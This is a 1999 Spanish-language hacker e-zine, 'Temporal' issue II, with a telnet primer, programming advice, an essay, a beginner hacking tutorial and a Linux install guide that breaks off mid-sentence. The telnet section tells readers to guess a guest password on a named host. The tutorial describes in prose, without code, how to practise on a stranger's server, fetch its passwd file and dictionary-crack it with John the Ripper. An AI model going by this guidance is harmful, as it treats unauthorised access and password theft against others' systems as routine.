
XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX

          ___  ___  _  __       ___  O  _    ___  _ _  ___  ___
         /  _\/_  \| |/ _|    _|  _|| || |_ | O_|| \ || __|| O_|
         |_| \/ |_||___|  o  |___|  |_||___||___||_\_||___||___|.org
                            http://silence.tsx.org/
                           http://travel.to/silence
                               mr.silence@usa.net

XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
X                                                                              X
X                      *********************************                       X
X                      *                               *                       X
X                      *            TEMPORAL           *                       X
X                      *                               *                       X
X                      *                               *                       X
X                      *********************************                       X
X                                                                              X
X                         E-zine del mundo underground                         X
X                                                                              X
XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
X                                                                              X
X                                  Número II                                   X
X                                  Mayo 1999                                   X
X                                     (10)                                     X
X                                                                              X
XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX

                                  EQUIPO TEMPORAL
                                  
                          * Mr. Silence (org)
                            http://silence.tsx.org/

                          * Doctor X
                            Zona de Bacterias
                            http://bactery.8m.com
                            d0ct0r_x@bactery.8m.com

                          * Pequeño Saltamontes (PeSa)
                            pesa@starting-point.com

XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX

                                  DISTRIBUIDORES:

           http://surf.to/zs - Zine Store "Colección de E-Zines Hispanos"

XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX

NOTA: Todo lo que esta  en este numero es meramente  educativo, no incito a 
nadie a usar  lo que  se brinda  aqui, ademas algunos de  estos  textos han  
sido copiados de otros  autores y/o traducidos por mi, si un texto es tuyo  y no 
quieres  que  este aqui, dimelo y lo quitare de  la edicion  de este numero 
inmediatamente
                                            ZeD-wOrLd-EzInE

                                   (y aplica a este e-zine... - Equipo Temporal)

XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
CERO                                                                      Índice
XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX

Contenido

   - UNO. Editorial ............................ Un nuevo saludo
   - DOS. Información .......................... Listas y Vínculos
   - TRES. Newbies ............................. Telnet
   - CUATRO. Programar .. ...................... Programacion de Computadores
   - CINCO. Escritos ........................... El Mundo Subterráneo
   - SEIS. Tutorial ............................ Hacking - Capítulo 0
   - SIETE. Linux .............................. Instalación y otras cosas
   - OCHO. Programacion ........................ Curso de Assembler II
   - NUEVE. Rc-5 ............................... Distributed.net
   - DIEZ. Notas al Margen ..................... Cómo transformarse en hacker
   - ONCE. Cartas .............................. El cartero llama a la puerta
   - DOCE. Fin ................................. Breve Despedida
   - TRECE. PGP ................................ Llave Publica Mr. Silence
   - CATORCE. Aplicaciones ..................... Happy 99
   - QUINCE. Bye ............................... Punto Final

   - Hobbes.txt ................................ Cronología de Internet de
                                                 Hobbes v3.3

--------------------------------------------------------------------------------

XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
UNO                                                                    Editorial
XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX

Pasaron algunos meses antes de que me decidiera a escribir un segundo Temporal, 
esta vez replanteando muchas cosas, sobre todo la finalidad, y, claro está y 
para quienes han visitado la pagina, eso de publicar un boletín semanal quita 
bastante tiempo como para pensar en esta revista electrónica, pero gracias a 
unos correos recibidos, me animé definitivamente a esta segunda edición...

Algunas cosas seguiran igual, los "cut&paste" de otros magazines continuarán 
pues las colaboraciones han sido muy pocas, pero las ganas (como siempre) 
muchas...

Agradezco la ayuda y envío un saludo a los nuevos integrantes del equipo de esta 
revista electrónica (son ellos Doctor X y Pesa), que pese a todo lo que va 
ocurriendo espero que se mantenga como una publicación más frecuente.

Termino aquí estas cortas palabras de esta edición, quisiera al terminar decir 
que está la posibilidad de un Temporal III y tratar de convertir el e-zine más 
que en otro del montón, en un punto de encuentro que permita conocer acerca de 
este llamado Mundo Subterráneo y sobre todo del olvidado rincón llamado 
Colombia.

Como novedades, no hay sección de noticias, pues el boletín semanal que publico 
las trae, además serán noticias pronto desactualizadas, más bien voy a tratar de 
traer textos y escritos que puedan ser más duraderos hacia el futuro. Aparece la 
sección Newbies con información de esa que sirve para que uno vaya aprendiendo, 
por si este e-zine cae en manos de alguien que quiere entrar a este "mundillo". 
De todas formas la sección de Tutorial parece cumplir el mismo propósito, un 
poco de información para newbies (¡como yo...!)

Han pasado muchas cosas en este tiempo: SET, JJF, Raza, Zed, Proyecto R han 
editado nuevos números de sus e-zines, apareció Inet, legislaciones antihack van 
y vienen, el euro por fin está agarrando fuerza, telefónica.es ya empieza a 
ofrecer algo parecido a la tarifa plana, linux está siendo acogido por las 
grandes casas productoras (más bien ensambladoras) de computadoras... Como ven 
uno no puede cerrar los ojos un día porque el mundo ha cambiado; de todas 
formas, y como misión principal... ahí les queda esta revista electrónica...

                                            --FIN--

P.D. Me aburrí de escribir sin tildes, así que por ahora vuelven las tildes y si 
alguien tiene problemas de visulización, que por favor lo  diga y trato de 
remediar el problema.

P.D.D. Para este boletín utilicé el UltraEdit 32 que  me parece un muy buen      
procesador de textos, tanto normales como de programación...

                                                                Mr. Silence
                                                         mr.silence@usa.net

--------------------------------------------------------------------------------

XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
DOS                                                                  Información
XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX

Bueno, algo de información que he tenido tiempo de extractar de la red, listas
de distribución, páginas, etc...

Listas en Onelist:

Raredudez - raregazz... una lista para preguntar y aprender
Aprendiendo - Newbies... ¿quién no lo deja de ser?
Rarenovatos - Siempre es bueno preguntar lo que no se entiende
mr-silence - Un poco de publicidad, boletín semanal
elbaul - El Baúl de Maikel Night Para leer otras cosas diferentes
hackersv - Hackers venezuela, buen intercambio de información, el problema es
           que esa lista está moderada a sólo 40 personas...

Para subscribirse a ellas hay que enviar un correo vacío a:
nombre de la lista-subscribe@onelist.com
o ir a la dirección:
http://www.onelist.com/subscribe.cgi/nombre de la lista

Listas en listbot:
uha1 - United Hackers Magazine
mr.silence - Más publicidad, lista de discusión

Para subscribirse hay que enviar un mensaje vacío a:
nombre de la lista-subscribe@listbot.com
o ir a la dirección:
http://nombre de la lista.listbot.com/

--------------------------------------------------------------------------------

XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
TRES                                                                     Newbies
XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX

Telnet.

El protocolo diseñado para proporcionar el servicio de conexión remota (remote 
login) recibe el nombre de TELNET, el cual forma parte del conjunto de 
protocolos TCP/IP y depende del protocolo TCP para el nivel de transporte.

El protocolo TELNET es un emulador de terminal que permite acceder a los 
recursos y ejecutar los programas de un ordenador remoto en la red, de la misma 
forma que si se tratara de un terminal real directamente conectado al sistema 
remoto. Una vez establecida la conexión el usuario podrá iniciar la sesión con 
su clave de acceso. De la misma manera que ocurre con el protocolo FTP, existen 
servidores que permiten un acceso libre cuando se especifica "anonymous" como 
nombre de usuario.

Es posible ejecutar una aplicación cliente TELNET desde cualquier sistema 
operativo, pero hay que tener en cuenta que los servidores suelen ser sistemas 
VMS o UNIX por lo que, a diferencia del protocolo FTP para transferencia de 
ficheros donde se utilizan ciertos comandos propios de esta aplicación, los 
comandos y sintaxis que se utilice en TELNET deben ser los del sistema operativo 
del servidor. El sistema local que utiliza el usuario se convierte en un 
terminal "no inteligente" donde todos los caracteres pulsados y las acciones que 
se realicen se envían al host remoto, el cual devuelve el resultado de su 
trabajo. Para facilitar un poco la tarea a los usuarios, en algunos casos se 
encuentran desarrollados menús con las distintas opciones que se ofrecen.

Los programas clientes de TELNET deben ser capaces de emular los terminales en 
modo texto más utilizados para asegurarse la compatibilidad con otros sistemas, 
lo que incluye una emulación del teclado. El terminal más extendido es el VT100, 
el cual proporciona compatibilidad con la mayoría de los sistemas, aunque puede 
ser aconsejable que el programa cliente soporte emulación de otro tipo de 
terminales.

Telnet es un Protocolo de comunicaciones que te permite conectarte a un equipo 
remoto a modo de Terminal, esto quiere decir, que tu PC se convierte en un 
Terminal de esa máquina, permitiendote realizar operaciones en la misma en 
tiempo real.

Telnet realiza la conección (por default) en el puerto 23 del equipo remoto, 
(cabe destacar que no todas las estaciones en la red prestan este servicio), al 
realizar la conección con el equipo remoto, y dependiendo del tipo de estación o 
servicio, te será presentado "un desafío", o "login" al sistema, que consiste en 
identificarte con el mismo por medio de tu User ID y tu Password.

El sistema compara el login con los archivos de passwords, y si la información 
es correcta, te da entrada al sistema, de lo contrario ya te imaginas... Acces 
denny ;-)

Bien, vamos a probar Telnet, suponiendo que utilizas Windoze, en el menú de 
programas invoca "Msdos", en el Prompt del sistema coloca:

c> Telnet 

Presiona enter (OOOH!!) y se te abrirá una nueva Ventana con el protocolo 
activado...

En la barra superior de telnet vas a conseguir:

Conectar - Edición - Terminal - Ayuda

En el menu "Conectar" vas a conseguir : "Sistema remoto", "Desconectar", 
"Salir", (luego, en ese mismo menu, a medida que te vayas conectando a equipos 
remotos, seran almacenados los Dominios de los Mismos).

En el menú "Edición", vas a encontrar: "Copiar", "Pegar", <----Atención: esto es 
sumamente util, Recomiendo que copies tus sesiones, y las pegues en un archivo 
de NotePad, de esta manera, podras estudiar tus sesiones con sumo detenimiento 
una vez "Off-Line".

En el Menú "Terminal" vamos a conseguir "Preferencias", Ojo aquí, cuando invokes 
"preferencias", te saldrá una caja llamada "Preferencias de Terminal", compuesta 
por 4 casillas de Verificación en la parte de "Opciones de Terminal", esas 
opciones son "Eco Local", esa casilla normalmente no está seleccionada, dejala 
así, debes seleccionarla en determinados casos, ( como cuando te conectes al 
servidor SMTP, de esta manera podrás ver lo que escribes de resto, puedes llevar 
las sesiones normalmente)y 2 casillas de verificación en la parte de emulación, 
dejala en VT100, (es un Standard), 2 botones para las preferencias de fuente y 
fondo,(recomiendo poner fondo negro, y las letras en amarillo o Verde, es mas 
"Kool"), en el tamaño del buffer, dejalo en lo máximo posible: 999 así, podrás 
examinar las partes de la sesión que han "Subido" hasta perderse en la parte 
superior de la barra de la ventana.

Bien, ya que le hemos echado un Vistazoa Telnet, Vamos a Practicar con el...:

Cuando estes conectado a Internet, invoka a Telnet, haz clik en "Sistema 
Remoto", se te abrirá una caja con: Nombre del Host (Aquí colocas el Nombre de 
dominio del sistema al que te quieres conectar).

Puerto: Por ahora... dejalo en Telnet :-)

Tipo de Terminal: dejalo en VT100 (ese me gusta).

Luego, CONECTAR!! MUUUHAHAHA!!!

Bueno, Practica conectandote a los dominios que quieras, de esta manera, te 
harás mas agil utilizando Telnet, aquí te voy a dar unos dominios por si te 
falta imaginación:

whois.internic.net

whois.eunet.es

koan.happyhacker.org <--- Presten atención, aquí han puesto una cuenta "Guest", 
solo deben adivinar el password para entrar, (es facilito), en Login, coloquen 
Guest y en Password, es tan Stupid que no tardarán en entrar...

     ====================================================

     Realizado por:

     Merlin
     Kliber
              HACKERS VENEZUELA

--------------------------------------------------------------------------------

XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
CUATRO                                                                 Programar
XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX

Programación de Computadores

--------------------------------------------------------------
No me hago responsable por lo que este documento puede hacer, lealo bajo su 
responsabilidad.
--------------------------------------------------------------

Olvide todas las historias y tabúes alrededor de lo difícil que es programar una 
computadora. Ignore todos los relatos de esfuerzos sobrehumanos y 
desproporcionados de la programación, solo preocúpese si es un lammer y lo unico 
que quiere son fórmulas mágicas para hacer las cosas.

Aprender a escribir programas de computadora no es difícil, inclusive resulta 
ser muy entretenido, solo tiene que tener claro en su mente que es lo que quiere 
hacer o que es lo que espera de la programación, si piensa obtener un 
pensamiento ordenado y logico, o si quiere comenzar a resolver acertijos y 
problemas, o simplemente desea tener un control total de su computadora, 
entonces es usted el candidato perfecto para comenzar a programar.

Para aprender a programar se necesitan varios conocimientos previamente 
aquiridos no solo el tener un computador de regalo de navidad le da suficientes 
méritos para empezar a programar, se necesita un profundo conocimiento de como 
actúa el computador, qué partes tiene, cómo se comunican entre ellas, cómo 
funciona su sistema operativo que debe ser linux o en el peor de los casos DOS, 
Ademas de tales conocimientos necesita tener tiempo libre que quiera utilizar y 
mucha disposición para comenzar a practicar, pues la programacion no es solo 
aprendizaje teórico, también necesita práctica que a mi forma de ver es lo más 
importante.

El cómo comenzar a programar es una pregunta difícil de responder, puesto que 
actualmente se tiene acceso a variedad de lenguajes, sistemas operativos, 
compiladores gratuitos o no y en fin, un sinnúmero de herramientas que para el 
programador novato e incluso medio lo confunden y hacen perder el entusiamo, en 
este corto texto, que tal ves pueda tener varias entregas, intentare guiar sus 
primeros pasos por el camino de la programación, recuerde muy bien las 
condiciones bajo las cuales esta leyendo este texto, para que después no me eche 
la culpa.

La programación de computadores para los hackers es un requisito fundamental 
inclusive en varios textos de alto rango informático consideran que un hacker es 
un gurú de la programación y no un pirata informático. Pero que tanto puede 
ofrecer la programación de computadores que casi divide al mundo digital en 2 
bandos, muy fácil: uno es la manada y el otro los vaqueros que hacen lo que 
quieran con la manada; ampliando lo anterior, las personas que usan el 
computador como una herramienta de trabajo estan sometidos a los programadores 
ellos imponen sus programas, sus filosofías de trabajo, sus estándares de lo que 
sea y son los que están dando órdenes a la manada de como debe trabajar, ahora 
tambien hay tipos de vaqueros, hay clases entre ellos, unos que solo quieren el 
bien personal y nunca le interesan los problemas y dificultades que pueda tener 
el usuario con sus programas como es el caso de Bill Gates, o vaqueros que 
cuidan minusiosamente su manada, que se preocupan por ella, que no duermen por 
mantenerla en perfectas condiciones y que su trabajo no tiene fines personales 
como es el caso de Linus Torvalds (el creador de linux por si no lo sabía, si no 
sabe quien es Bill Gates entonces mejor no siga leyendo este texto y lea otro 
tipo de cosas, no se "computadores para dummies" o algo por el estilo), este 
texto está redactado con la filosofía de que el que lo lea no será una persona 
que quiere enriquecerse a costa de las otras personas, sino alguien que dedica 
su trabajo y esfuerzo a toda la sociedad y que tal trabajo será o ya fue 
recompensado.

Lo que ud puede hacer siendo un programador de computadores, es dejar de ser un 
simple bovino y comenzar a utilizar su computador al 110% o tal ves más ya 
tendra una verdadera y completa herramienta de trabajo que no lo domina, 
escribiendo un poco mas real, usted puede hacer sus propias aplicaciones que no 
le gusta hacer, desde un simple programa que resuelva una sopa de letras, hasta 
programas verdaderamente completos que puede dejar a su secretaria libre de 
tareas monotonas y que tenga mas tiempo para ud ;-), o tal ves un pro- grama que 
haga sus tortuosas 1000 ejercicios de factorización que le pidio su novia.

Tambien debe tener en cuenta ciertas cualidades que rodean a un programador: 
primero, debe ser muy paciente, porque la programación no es de aceleres y nunca 
tendrá buenos resultados si usted no tiene una mente tranquila para programar; 
segundo, usted quiere aprender a programar por motivos de peso, es un camino 
largo y se deben tener buenas razones para no sucumbir, si ud solo piensa en 
aprender en programar para hacer una bonito instalador para su script o por 
descrestar a su clase o por tener su nombre en los que colaboraron realizando 
linux o lo que sea, no aprenda a programar, primero búsquese un buen motivo y 
después comience este largo recorrido.

Si esta cansado de leer carreta que nada tiene que ver con programación, igual 
estoy yo de cansado de escribirla entonces voy a dar informacion importante que 
podré extender segun se necesite. Para programar lo primero que hay que definir 
es en qué lenguaje, hay muchos de ellos; recomiendo para personas que nunca han 
programado, comenzar con uno común para que cualquier persona con algo de 
conocimientos le pueda ayudar y pueda conseguir buena documentacion. Por lo 
tanto es bueno aprender a programar en un lenguaje como BASIC, o Pascal, también 
hay muchos otros pero sea cual sea el que escoja, despues de saber como es la 
programacion pasar de un lenguaje a otro es mucho mas fácil de lo que se 
imagina, todos los lenguajes dicen lo mismo sólo que con distinto orden y 
palabras, pero las palabras de un lenguaje de programación no pasan de 50 y el 
orden no es muy complicado. Nunca escoja para aprender un lenguaje de 
programacion de bajo nivel (que sea muy parecido al codigo que ejecuta la 
maquina), prefiera un lenguaje de alto nivel (que parezca al lenguaje humano), 
por lo tanto olvídese de aprender a programar en asembler o lenguaje de maquina, 
no es imposible pero si será extremadamente complicado.

Despues de escoger su lenguaje de programación tiene que buscar ahora alguna 
información sobre él: si es un lenguaje interpretado o compilado, y con que 
programas puede ejecutarlo, tal informacion es fácil encontrarla en internet o 
cualquier libro sobre ese lenguaje, por ejemplo para programar en BASIC, es 
recomendable trabajar en QBasic, antes que en Visual Basic, puesto que el QBasic 
es mas reducido y por lo tanto no tendra que grabarse muchos comandos y 
restricciones, recuerde que la curva de aprendizaje de la programación no es 
fija, puesto que según el camino que se coja va marcando su pendiente, tenga en 
cuenta que la programación es una de las pocas cosas que no tienen un cambio 
acelerado en el mundo de la computacion, desde la decada de los 70 existe el 
lenguaje de programacion de C (no es canon), y sus cambios han sido muy pocos y 
todavia es posible programar en C (K&R) en los compiladores mas actuales, (K&R, 
son las primeras reglas que conformaron el lenguaje C) inclusive para que un 
compilador sea compatible con el lenguaje C tiene que trabajar perfectamente con  
el estándar K&R, logicamente en este momento se tienen estándares mucho más 
avanzados que facilitan la programacion en C tales son C ANSI y el C++. Entonces 
debe tener en cuenta que si usted aprende a programar, sus conocimientos no se 
desvaneceran por el tiempo, a diferencia del resto de sucesos alrededor de los 
computadores.

Ahora que ya tiene un lenguaje escogido y la forma de aprenderlo ya sea un 
tutorial de internet o un libro o lo que sea, tiene ademas el entorno de trabajo 
respectivo ya definido, le recomiendo que haga una copia de seguridad de los 
archivos mas importantes de su sistema, la programación es un arma de doble filo 
y si por equivocación usted en vez de crear un archivo remplaza uno existente o 
le da no sé cómo por probar unas funciones raras que cambian el sistema de 
archivos o cualquier cosa, es mejor que no llore, más bien tenga a la mano las 
copias de seguridad, aunque a mi personalmente se me ha perdido mas informacion 
por bloqueos de mi ex sistema operativo windows y por cortes de luz que por 
errores de programación, pero de todas maneras hay riesgos y es mejor tomar las 
medidas del caso.

Bueno ahora ya que tiene donde trabajar y la forma de estar tranquilo, comience 
a jugar al programador haga cualquier programa, lo que ud quiera y deje de jugar 
doom o f-22 o simcity 3000 o lo que sea y dedíquese a programar, así tendra otra 
forma de diversión la cual está forjando una poderosa arma para su conocimiento, 
ya no se asustara por un virus o sabrá cuando tiene uno sin necesidad de un 
programa antivirus, podra vacunar su pc manualmente y estar mucho más seguro de 
que resultados tendran sus acciones dentro del pc, ya que conoce lo que hace 
internamente cada acción, podrá encontrar la forma en que juegan sus 
contrincantes en sus juegos y podra hallar la forma tonta de eliminarlos y otro 
sinnúmero de beneficios que descubrirá cuando comience a programar.

Bueno cualquier pregunta no muy tonta o algun comentario me lo pueden formular a 
mi correo pesa@starting-point.com.


				By: Pequeño Saltamontes.

--------------------------------------------------------------------------------

XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
CINCO                                                                   Escritos
XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX

EL MUNDO SUBTERRÁNEO
(Ciencia Ficción extractada de la realidad pero sin ninguna trascendencia)
Mr. Silence

Con ese título podría imaginarme toda una ciudad bajo la tierra, en la cual 
conviven seres humanos quienes por un motivo u otro, por ejemplo una guerra 
nuclear que haga irrespirable el oxígeno sobre la superficie -sin disertaciones 
de si se puede o no-, tienen que llevar una vida sin sol ni plantas, o mejor, 
con algunos elementos artificiales que permitan no olvidar la vida en la tierra.

Pero definitivamente no es de lo que pienso hablar... Actualmente vivimos en 
mundos subterráneos, sin sol, sin plantas, o con elementos puestos en forma 
artificial para que brinden una confusa pero casi creíble visión de la realidad. 
No estoy hablando de un modo de vida sin naturaleza, sino un modo de vida en el 
que no podemos movernos libremente, no somos ni siquiera dueños de nuestro 
tiempo ni de nuestras costumbres, a cada momento nos dicen qué debemos hacer y 
qué tenemos que hacer sin posibilidad de decidir pues dependemos de decir sí para
lograr nuestras metas...

Podría terminar aquí diciendo que la realidad se torna más irreal de lo que 
podía haber llegado a ser, nos creemos todas las mentiras y sin saberlo somos 
mentiras que pululan en una realidad falsa, en creencias falsas y sin saber 
hacia donde dirigirse ni qué camino tomar...

Sólo hay una raza que no está dentro de este consumo, ellos viven solos pues 
creen ser los únicos, todas sus ideas van muriendo por la falta de encuentro y 
de creencias sólidas; al final, la lucha no es con ellos ni de ellos, el mundo se 
cansó de escucharlos y no quiere saber que existen, entonces dentro del mundo 
subterráneo hay otro más profundo, solo, que parece más una leyenda, en el que 
por falta de costumbre nadie cree ni piensa entender ni buscar.

Así mueren sin espacio ni oxígeno, ahogados por su mismo gas carbónico y 
queriendo respirar, rodeados de todo lo que les parece desperdicio pero a lo que 
se han acostumbrado; sin definitivamente saber que eran otros, una raza 
especial, un minuto en el extraño divagar del tiempo que hemos querido acelerar 
a sólo unas pocas horas...

--------------------------------------------------------------------------------

XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
SEIS                                                                   Tutorial
XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX

"""""""""""""""""""""""""""""""""""""""
"""""""""""""""""""""""""""""""""""""""         by: (((((aDm)))))
@@              Hacking              @@
"""""""""""""""""""""""""""""""""""""""
"""""""""""""""""""""""""""""""""""""""

#####  #####  ##### #####  #####  #   #  #      #####           ªªªªªªª
#      #   #  #   #   ##    ##    #   #  #      #   #           ª     ª
#      #####  #####   ##    ##    #   #  #      #   #           ª     ª
#####  #   #  #     #####   ##    #####  #####  #####           ªªªªªªª

Hola, soy aDm y he decidido hacer un texto para pricipiantes o newbies que 
quieren aprender y que no entienden los centenares de manuales que hay por ahi, 
y mil veces menos en ingles:-)

Bueno, para empezar, voy a hablar sobre escoger un servidor y averiguar ciertas 
cosas de el:

Para escoger un servidor, esta claro que para aprender escogeremos uno sin 
importancia y si se puede uno lejos de nosotros, por si acaso.

Antes de empezar a Hackear, conviene saber un poco de Unix, las ordenes basicas 
que se suelen usar. Unix, pal que no lo sepa (un poco memo hay qe ser),es el 
sistema operativo mas usado en servidores, porque es mucho mas robusto y mas 
seguro que Windows, pero aun asi tiene sus fallos:-) Unix tiene una version para 
Pc llamada Linux, y si se puede, es conveniente hacerse con alguna distribucion 
(es gratis), suelen venir en revistas.

Ahora analizaremos que es un servidor. Un servidor es un ordenador que esta 
conectado a internet y nos ofrece una serie de servicios "web, telnet, ftp, 
news, mail, IRC,..." Cada uno de ellos utiliza un puerto con unos protocolos 
determinados, pero, ¿que es un puerto?. Imaginemos un ordenador personal con 
impresora (LPT), raton (COM), etc.. Cada periferico tiene un puerto para poder 
realizar sus funciones. Con los servidores de internet pasa algo muy parecido 
solo que utilizan muchos mas puertos, uno distinto por cada servicio que 
ofrezcan. Voy a poner un ejemplo que lei en una lista de correo: si tu fueras 
ladrón y buscaras en un barrio casas para robar, entonces tienes que escoger en 
el barrio (Internet) luego la casa (servidor) y luego ir mirando si alguna 
puerta o alguna ventana está mal cerrada para introducirte (escaneo de 
puertos)´´´Mr. Silence```

Estas entradas solo deven de estar abiertas en caso de que realmente se 
utilicen, de manera que cuantos menos puertos haya abiertos, menores 
posibilidades de entrar habra. Por ello, si utilizamos un servidor nada mas que 
para mostrar paginas web, es un error muy grande dejar abiertos otros puertos.

No hay un servidor impenetrable, pero hay mucha diferencia entre unos y otros. 
La mayoria depende de los administradores o root`s que la controlen, y del 
software que utilizen. Cuanto mas viejo sea el software, sera mas facil entrar 
en el, pero puede que el administrador del sistema lleve unos cuantos añitos de 
experiencia, y que se las sepa todas. Al contrario, un servidor nuevo, puede 
tener un software nuevo y potente pero que el administrador sea un novato que no 
tiene ni idea. 

Y ahora os preguntareis ¿como buscan la informacion?, ¿no?. Pos bien de entre 
los multiples servicios de Internet cabe destacar el telnet (lo tienen todos los 
ordenadores, prueba poniendo telnet en el dos), que nos permite conectarnos a un 
ordenador de manera que, una vez dentro, podamos trabajar como si de nuestro 
ordenador se tratara, pero eso si, usando su sistema operativo. TELNET es el 
protocolo de "conexión" a otro ordenador, de hecho la mayoria de los servicios 
posteriores, se basan en telnet (pe. FTP, HTTP). Haciendo telnet a una máquina, 
ejecutas programas en ella, recibiendo tu la entrada/salida de los datos.

Tambien hay otro servicio, el ftp, que facilita el envio y la recepcion e datos 
entre maquinas, aunque sin permitir la ejecucion de ningun programa en el 
ordenador remoto. Para poder utilizar y  poder entrar en los ordenadores remotos 
hay que introducir un nombre de usuario (login) y una contraseña (password). 
Segun el login y el password que identifican al usuario, tienes distintos 
privilegios y distintos directorios de trabajo, esto es lo que se le llama a un 
sistema operativo multiusuario. (windows NT, Unix o algun derivado de este: AIX, 
SunOs, Solaris, Irix, Convex, Linux... )

Estos sistemas permiten acceder muchas personas al mismo tiempo, cada una con un 
directorio de trabajo y unos previlegios determinados, de manera que el usuario 
"user1" no pueda ver la parte de disco duro de "user2", ademas de no acceder a 
muchas partes del sistema, como la configuracion de este. 

Solo un usuario conocido como root o superusuario, tiene poder para hacer lo que 
realmente quiera. Este es el administrador del sistema, encargado de su correcto 
funcionamiento. Si alguna persona con fines destructivos conseguiera ser 
superusuario, las consecuencias podrian desastrosas:-)) Incluso podria negarle 
acceso al propio administrador.

Todo sistema Unix tiene un fichero llamado "passwd" o "shadow" que contiene 
datos y contraseñas de los usuarios. Este fichero puede obternerlo y leerlo 
cualquier persona con acceso al servidor sin necesidad de tener unos 
conocimientos muy amplios. Este fichero se puede obtener via ftp. A veces, unos 
servidores permiten entrar como usuario anonimo y se puede obtener dicho 
archivo. Pero muchos servidores no dejan conectarse como anonimo y coger el 
fichero. Naturalmente, las contraseñas estan encriptadas con un algoritmo que no 
permite descifrado. Podemos cifrar una palabra 100 veces que nunca nos dara  la 
misma cadena resultante. Pero, si nosotros no podemos desencriptarlo, tampoco 
podra el sistema.

Cuando introducimos una contraseña, el sistema la encripta y la compara con una 
parte de la almacenada en el fichero "passwd" o "shadow", dependiendo de la 
configuracion. Si coincide, la da como valida y nos permite el acceso. De la 
misma manera un hacker puede capturara este fichero y con un diccionario y un 
pequeño programa ir encriptando y comparando palabas hasta dar con la contraseña 
buscada. El mejor crackeador de passwords es John The Ripper, y su version mas 
nueva creo que va por la 1.7 Se pueden coger muchas listas de palabras en muchos 
ftps, o buscando en buscadores como www.altavista.com "dictionary", "wordlist".

Esta claro que la finalidad de un hacker es llegar a ser root, pero ¿como 
consigue entrar?,y una vez dentro ¿como logra el control absoluto de la maquina? 
Como se puede obtener el fichero passwd sin tener acceso?

+++++++proximo capitulo.....

--------------------------------------------------------------------------------

XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
SIETE                                                                      Linux
XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX

Zona de Bacterias
http://bactery.8m.com
por DoctorX  email:d0ct0r_x@bactery.8m.com
Instalando Linux , Particiones y Otras Cosas.

========================================================================

    Linux es un Sistema operativo muy versatil y que tiene la ventaja de
tener el apoyo de un gran numero de programadores al rededor  del  mundo 
para el desarrollo  de software los cuales  en  algunos  casos  trabajan
gratis   lo cual  ha permitido que sea el SO que se  ha desarrolado  con
mayor  informacion en  la  historia  de  la Informatica , pasando de ser
utilizado  por  un  7 %  de  los usuarios de Computadoras en el Mundo en
el 97 a un 18% en el 98, lo  cual  muestra  como  ha  se  ha ido ganando
adeptos  debido  a  sus multiples funciones y fortaleza aunque sin perder 
lo  oscuro  de  un sistema  unix  por  lo  cual a veces  configurar  una
distribucion de Linux no es tarea facil .

    Para iniciar  la  instalacion de  Linux primero necesitas elegir una
distribucion  ,  existen  5  distribuciones  que  a  mi juicio  son  las
mas utilizadas :

Red Hat  Linux :una verdadera obra de arte  y  muy facil  de  instalar ,
ademas  de ser en  la actualidad el  mas  popular  en  U.S.A  ademas que
por experiencia te  digo  que es mas facil de configurar que  cualquiera
de  las   otras  y  la  instalacion  de  nuevo  software  es  mucho  mas
facil y rapida en estos menesteres .

Slackware Linux : esta  tambien  es   una  muy  buena  distribucion , un
poco oscura en su manejo en  cuanto  configuracion de hardware  y  demas
pero  tambien  a  mi  juicio  la  mas  apropiada  para  el  hacking
